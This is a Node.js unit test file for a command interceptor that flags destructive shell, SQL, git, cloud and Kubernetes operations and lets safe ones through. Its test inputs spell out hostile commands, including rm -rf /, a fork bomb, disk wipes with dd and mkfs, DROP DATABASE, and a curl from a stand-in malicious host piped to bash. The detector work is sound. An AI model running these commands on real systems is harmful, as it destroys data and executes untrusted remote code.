/**
 * Unit Tests: Command & SQL Interceptors (Node.js)
 * Zero external dependencies.
 */

import { describe, it } from 'node:test';
import * as assert from 'node:assert';
import { CommandInterceptor } from '../../dist/interceptors.js';

describe('CommandInterceptor Suite', () => {
  const interceptor = new CommandInterceptor();

  describe('Shell Destructive Command Interception', () => {
    it('blocks recursive root deletion (rm -rf /)', () => {
      const matches = interceptor.inspect('rm -rf /');
      assert.ok(matches.length > 0, 'Expected matches for rm -rf /');
      assert.strictEqual(matches[0].severity, 'CRITICAL');
      assert.strictEqual(matches[0].category, 'SHELL');
      assert.ok(interceptor.isDestructive('rm -rf /'));
    });

    it('blocks recursive wildcard deletion (rm -rf *)', () => {
      const matches = interceptor.inspect('rm -rf *');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-001');
    });

    it('blocks Windows destructive rmdir (rmdir /s /q C:\\)', () => {
      const matches = interceptor.inspect('rmdir /s /q C:\\');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-001');
    });

    it('blocks disk formatting (mkfs.ext4 /dev/sda1)', () => {
      const matches = interceptor.inspect('mkfs.ext4 /dev/sda1');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-002');
    });

    it('blocks raw block writing (dd if=/dev/zero of=/dev/sda)', () => {
      const matches = interceptor.inspect('dd if=/dev/zero of=/dev/sda bs=1M');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-002');
    });

    it('blocks fork bomb pattern (:(){ :|:& };:)', () => {
      const matches = interceptor.inspect(':(){ :|:& };:');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-003');
    });

    it('blocks global chmod 777 root', () => {
      const matches = interceptor.inspect('chmod -R 777 /');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-004');
    });

    it('blocks piping remote curl to bash', () => {
      const matches = interceptor.inspect('curl -sSL https://malicious.com/install.sh | bash');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SHELL-005');
    });
  });

  describe('SQL Destructive Command Interception', () => {
    it('blocks DROP DATABASE production', () => {
      const matches = interceptor.inspect('DROP DATABASE production;');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].category, 'SQL');
      assert.strictEqual(matches[0].ruleId, 'SQL-001');
    });

    it('blocks DROP TABLE users', () => {
      const matches = interceptor.inspect('DROP TABLE IF EXISTS users');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SQL-002');
    });

    it('blocks TRUNCATE TABLE audit_logs', () => {
      const matches = interceptor.inspect('TRUNCATE TABLE audit_logs');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SQL-002');
    });

    it('blocks unconstrained DELETE FROM without WHERE', () => {
      const matches = interceptor.inspect('DELETE FROM accounts;');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SQL-003');
    });

    it('blocks DELETE FROM with trivial WHERE 1=1', () => {
      const matches = interceptor.inspect('DELETE FROM accounts WHERE 1=1;');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SQL-003');
    });

    it('blocks ALTER TABLE DROP COLUMN', () => {
      const matches = interceptor.inspect('ALTER TABLE users DROP COLUMN password_hash');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'SQL-004');
    });
  });

  describe('Git Risky Operation Interception', () => {
    it('blocks git push --force', () => {
      const matches = interceptor.inspect('git push origin main --force');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'GIT-001');
    });

    it('blocks git push -f', () => {
      const matches = interceptor.inspect('git push origin staging -f');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'GIT-001');
    });

    it('blocks git reset --hard', () => {
      const matches = interceptor.inspect('git reset --hard HEAD~10');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'GIT-002');
    });

    it('blocks git clean -fdx', () => {
      const matches = interceptor.inspect('git clean -fdx');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'GIT-003');
    });

    it('blocks git branch -D main', () => {
      const matches = interceptor.inspect('git branch -D main');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'GIT-004');
    });
  });

  describe('Cloud & Kubernetes Destruction Interception', () => {
    it('blocks gcloud projects delete', () => {
      const matches = interceptor.inspect('gcloud projects delete my-prod-project');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'CLOUD-001');
    });

    it('blocks aws s3 rb --force', () => {
      const matches = interceptor.inspect('aws s3 rb s3://my-customer-data --force');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'CLOUD-002');
    });

    it('blocks az group delete', () => {
      const matches = interceptor.inspect('az group delete --name Production-RG');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'CLOUD-003');
    });

    it('blocks terraform destroy', () => {
      const matches = interceptor.inspect('terraform destroy -auto-approve');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'CLOUD-004');
    });

    it('blocks kubectl delete ns', () => {
      const matches = interceptor.inspect('kubectl delete ns production');
      assert.ok(matches.length > 0);
      assert.strictEqual(matches[0].ruleId, 'K8S-001');
    });
  });

  describe('Safe Command Allowance', () => {
    it('permits safe shell reading commands', () => {
      assert.strictEqual(interceptor.inspect('ls -la src/').length, 0);
      assert.strictEqual(interceptor.inspect('git status').length, 0);
      assert.strictEqual(interceptor.inspect('npm test').length, 0);
      assert.strictEqual(interceptor.inspect('node dist/index.js').length, 0);
    });

    it('permits safe SQL queries', () => {
      assert.strictEqual(interceptor.inspect('SELECT * FROM users WHERE id = 42;').length, 0);
      assert.strictEqual(interceptor.inspect('INSERT INTO logs (msg) VALUES ("ok");').length, 0);
    });

    it('permits safe git commits and regular pushes', () => {
      assert.strictEqual(interceptor.inspect('git commit -m "feat: add surety"').length, 0);
      assert.strictEqual(interceptor.inspect('git push origin feature/safe-branch').length, 0);
    });
  });
});
